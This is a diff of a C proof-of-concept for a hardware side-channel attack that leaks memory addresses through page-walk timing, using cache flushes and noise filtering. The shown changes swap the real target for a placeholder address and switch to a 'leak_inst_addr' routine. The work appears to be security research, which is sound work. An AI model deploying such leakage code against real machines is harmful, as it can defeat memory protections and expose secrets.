@@ -105,22 +105,22 @@ uint64_t setup_trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
   //_mm_clflush((void *)signal_function);
   //_mm_clflush((void *)noise_function);
   _mm_mfence();
-  spy_function(secret_function, ~0x7fff000000000000, 1);
+  spy_function(0x12345678, ~0x7fff000000000000, 1);
   _mm_clflush((void *)&arch_exec);
   //_mm_clflush((void *)signal_function);
   //_mm_clflush((void *)noise_function);
   _mm_mfence();
-  spy_function(secret_function, ~0x7fff000000000000, 1);
+  spy_function(0x12345678, ~0x7fff000000000000, 1);
   _mm_clflush((void *)&arch_exec);
   //_mm_clflush((void *)signal_function);
   //_mm_clflush((void *)noise_function);
   _mm_mfence();
-  spy_function(secret_function, ~0x7fff000000000000, 1);
+  spy_function(0x12345678, ~0x7fff000000000000, 1);
   _mm_clflush((void *)&arch_exec);
   //_mm_clflush((void *)signal_function);
   //_mm_clflush((void *)noise_function);
   _mm_mfence();
-  spy_function(secret_function, ~0x7fff000000000000, 1);
+  spy_function(0x12345678, ~0x7fff000000000000, 1);
   return __trash;
 }
 
@@ -176,7 +176,7 @@ void evict_dsb(void) {
   munmap(buffer, buffer_size);
 }
 
-void filter_function(uint64_t target, int *noise_filter) {
+void filter_function(uint64_t target, uint64_t *noise_filter) {
   noise_filter[VPN4_TO_CACHE_LINE(target)] += 2;
   noise_filter[VPN3_TO_CACHE_LINE(target)] += 2;
   noise_filter[VPN2_TO_CACHE_LINE(target)] += 2;
@@ -198,7 +198,7 @@ int main(void) {
   pwsc_init_reset(setup_trigger, NULL, trigger,
                   MEMORY_MAP_ORDER_ORACLE_EVICT_SIZES, 10, 64);
 
-  int init_noise_filter[64] = {0};
+  uint64_t init_noise_filter[64] = {0};
 
   filter_function((uint64_t)spy_function, init_noise_filter);
   filter_function((uint64_t)clear_phr, init_noise_filter);
@@ -206,7 +206,7 @@ int main(void) {
   filter_function((uint64_t)victim_function, init_noise_filter);
   filter_function((uint64_t)signal_function, init_noise_filter);
   filter_function((uint64_t)noise_function, init_noise_filter);
-  set_noise_filter(init_noise_filter);
+  // set_noise_filter(init_noise_filter);
 
   uint64_t val = *(uint64_t *)secret_function;
   printf("Secret function first 8 bytes: 0x%lx\n", val);
@@ -215,19 +215,19 @@ int main(void) {
   fprintf(stderr,
           "Target Secret Value: 0x%lx\tTarget's VPNs + PO are %lu %lu %lu %lu "
           "%lu\n",
-          (uint64_t)secret_function,
-          VPN4_TO_CACHE_LINE((uint64_t *)secret_function),
-          VPN3_TO_CACHE_LINE((uint64_t *)secret_function),
-          VPN2_TO_CACHE_LINE((uint64_t *)secret_function),
-          VPN1_TO_CACHE_LINE((uint64_t *)secret_function),
-          PO_TO_CACHE_LINE((uint64_t *)secret_function));
+          (uint64_t)0x12345678, VPN4_TO_CACHE_LINE((uint64_t *)0x12345678),
+          VPN3_TO_CACHE_LINE((uint64_t *)0x12345678),
+          VPN2_TO_CACHE_LINE((uint64_t *)0x12345678),
+          VPN1_TO_CACHE_LINE((uint64_t *)0x12345678),
+          PO_TO_CACHE_LINE((uint64_t *)0x12345678));
   fprintf(stderr, "\n\n\n");
 
   // Run the PWSC
-  struct pwsc_ans ans = run_pwsc((uint64_t)secret_function);
+  struct pwsc_ans ans =
+      leak_inst_addr((uint64_t)0x12345678, init_noise_filter, 0);
 
   // Stats
-  int correct_bits = bit_accuracy_checker(ans.va.va, (uint64_t)secret_function);
+  int correct_bits = bit_accuracy_checker(ans.va.va, (uint64_t)0x12345678);
   fprintf(stderr,
           "\nRecovered Secret Value: 0x%lx\tRecovered VPNs + PO are %lu %lu "
           "%lu %lu %lu\n",
